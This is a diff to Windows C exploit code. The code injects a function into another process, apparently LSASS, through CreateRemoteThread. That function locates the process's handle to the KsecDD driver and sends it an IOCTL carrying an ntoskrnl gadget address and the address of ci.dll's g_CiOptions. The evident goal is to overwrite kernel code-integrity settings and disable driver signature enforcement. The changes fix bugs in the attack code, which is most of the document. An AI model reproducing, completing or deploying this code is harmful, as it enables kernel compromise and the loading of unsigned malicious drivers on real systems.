@@ -5,26 +5,30 @@
 BOOL WINAPI LsaKsec_SendIoctl()
 {
 	BOOL status = FALSE;
-	PIPC_SET_FUNCTION_RETURN_PARAM pIpcSetFunctionReturnParameter = 0;
+	IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER InternalStruct = { 0x2121212121212121, 0x2222222222222222 };
+	PIPC_SET_FUNCTION_RETURN_PARAMETER pParameterStruct = 0;
 	PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
 	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
 	POBJECT_BASIC_INFORMATION pObjectBasicInformation = 0;
-	UINT64 rip = 0x2121212121212121;
-	UINT64 parameter = 0x2222222222222222;
 	ULONG szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0, iterator = 0;
-	DWORD ObjectName[] = { 0x44446365, 0x734b5c65, 0x63697665, 0x0000445c }; // "\Device\KsecDD" --> convert to unicode before compiling !
+	DWORD ObjectName[] = { 0x0044005c, 0x00760065, 0x00630069, 0x005c0065, 0x0073004b, 0x00630065, 0x00440044, 0x00000000 }; // L"\Device\KsecDD"
 
 	pObjectBasicInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(OBJECT_BASIC_INFORMATION));
-
-	if (((rip * 2) != 0x1090909090909090) && ((parameter * 2) != 0x1111111111111111) && (pObjectBasicInformation > 0))
+	pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
+	
+	/*
+	//if (((rip * 2) != 0x1090909090909090) && ((parameter * 2) != 0x1111111111111111) && (pObjectBasicInformation > 0))
+	if ((InternalStruct.rip != (0x1090909090909090 * 2)) && (InternalStruct.parameter != (0x1111111111111111 * 2)) && (pObjectBasicInformation > 0))
 	{
-		pIpcSetFunctionReturnParameter = (PIPC_SET_FUNCTION_RETURN_PARAM)((PLOCALALLOC)0x3131313131313131)(LPTR, (sizeof(UINT64) * 2));
+		pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
+		//pIpcSetFunctionReturnParameter = (PIPC_SET_FUNCTION_RETURN_PARAM)((PLOCALALLOC)0x3131313131313131)(LPTR, (sizeof(UINT64) * 2));
 	}
-
-	if (pIpcSetFunctionReturnParameter > 0)
+	*/
+	
+	if (pParameterStruct > 0)
 	{
-		pIpcSetFunctionReturnParameter->rip = rip;
-		pIpcSetFunctionReturnParameter->parameter = parameter;
+		pParameterStruct->pInternalStruct = &InternalStruct;
+		pParameterStruct->parameter = (UINT16)0;
 
 		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
 		{
@@ -44,7 +48,7 @@ BOOL WINAPI LsaKsec_SendIoctl()
 		{
 			for (iterator = 0; iterator < pSystemHandleInformation->HandleCount; iterator++)
 			{
-				if (pSystemHandleInformation->Handles[iterator].ProcessId == (ULONG)(*(PULONG)((PBYTE)__readgsqword(0x60) + 0x40)))
+				if (pSystemHandleInformation->Handles[iterator].ProcessId == (ULONG)(*(PULONG)((PBYTE)__readgsqword(0x30) + 0x40)))
 				{
 					if (((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, ObjectBasicInformation, (PVOID)pObjectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
 					{
@@ -53,18 +57,22 @@ BOOL WINAPI LsaKsec_SendIoctl()
 						else
 							szObjectInformationBuffer = pObjectBasicInformation->NameInformationLength;
 
-						pObjectNameInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, (SIZE_T)pObjectNameInformation);
+						pObjectNameInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, (SIZE_T)szObjectInformationBuffer);
 						if (pObjectNameInformation)
 						{
 							((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 1, (PVOID)pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
-							if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
+							if (pObjectNameInformation->Name.Buffer != NULL)
 							{
-								status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pIpcSetFunctionReturnParameter, 16, NULL, 0, NULL, NULL);
-								if (status)
+								if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
 								{
-									break;
+									status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pParameterStruct, 16, NULL, 0, NULL, NULL);
+									if (status)
+									{
+										break;
+									}
 								}
 							}
+							((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
 						}
 					}
 				}
@@ -75,7 +83,7 @@ BOOL WINAPI LsaKsec_SendIoctl()
 			}
 			((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
 		}
-		((PLOCALFREE)0x3232323232323232)(pIpcSetFunctionReturnParameter);
+		((PLOCALFREE)0x3232323232323232)(pParameterStruct);
 	}
 	if (pObjectBasicInformation)
 	{
@@ -229,51 +237,43 @@ int main(int argc, char* argv[])
 	UINT64 ci_g_cioptions = 0;
 	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0;
 	HANDLE hProcess = 0, hThread = 0;
-
-
-	DWORD ObjectName[] = { 0x5C004400, 0x65007600, 0x69006300, 0x65005C00, 0x4B007300, 0x65006300,  0x44004400, 0x00006A00 };
-
-	// 4B 73 65 63 44 44
-	DWORD ObjectNameA[] = { 0x7665445c, 0x5c656369, 0x6365734b, 0x00004444 };
-	// 5C 44 65 76 69 63 65
-	DWORD a[] = { 0x7665445c, 0x00656369 };
-	printf("%s\n", (char*)ObjectNameA);
 	
 	windows_version = GetOsBuildNumber();
-	if (windows_version == WINDOWS_UNSUPPORTED)
+	if (windows_version == WINDOWS_UNSUPPORTED) // correct
+	{
+		return 0;
+	}
+	else if (!EnablePrivilege(L"SeDebugPrivilege"))
 	{
 		return 0;
 	}
 
-	ntoskrnl_gadget = (UINT64)((PBYTE)GetDriverBaseAddress("ksecdd.sys") + NTOSKRNL_GADGET_OFFSET[windows_version]);
+	ntoskrnl_gadget = (UINT64)((PBYTE)GetDriverBaseAddress("ntoskrnl.exe") + NTOSKRNL_GADGET_OFFSET[windows_version]);
 	ci_g_cioptions = (UINT64)((PBYTE)GetDriverBaseAddress("ci.dll") + CI_G_CI_OPTIONS_OFFSET[windows_version]);
-
+	
 	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CI_OPTIONS_OFFSET[windows_version]))
 	{
 		for (i = 0; i < FakePtrsCount; i++)
 		{
 			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
-				(UINT64)ReplPointers[i].RealPtr = ntoskrnl_gadget;
+				ReplPointers[i].RealPtr = (PVOID)ntoskrnl_gadget;
 			if (ReplPointers[i].FakePtr == (PVOID)0x2222222222222222)
-				(UINT64)ReplPointers[i].RealPtr = ci_g_cioptions;
+				ReplPointers[i].RealPtr = (PVOID)ci_g_cioptions;
 		}
 	}
 
-	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, atoi(argv[1]));
+	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, atoi(argv[1]));
 	if (hProcess != INVALID_HANDLE_VALUE)
 	{
 		LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
 		if (LocalHandler)
 		{
 			RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
-			printf("%d\n", (DWORD)szRemoteHandler);
-			printf("0x%-016p\n", (PVOID)LocalHandler);
-			getchar();
 			RemoteHandler = ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
-			if (RemoteHandler)
+			if (RemoteHandler != NULL)
 			{
 				hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
-				if (hThread != INVALID_HANDLE_VALUE)
+				if ((hThread != INVALID_HANDLE_VALUE) && (hThread != 0))
 				{
 					WaitForSingleObject(hThread, INFINITE);
 					CloseHandle(hThread);
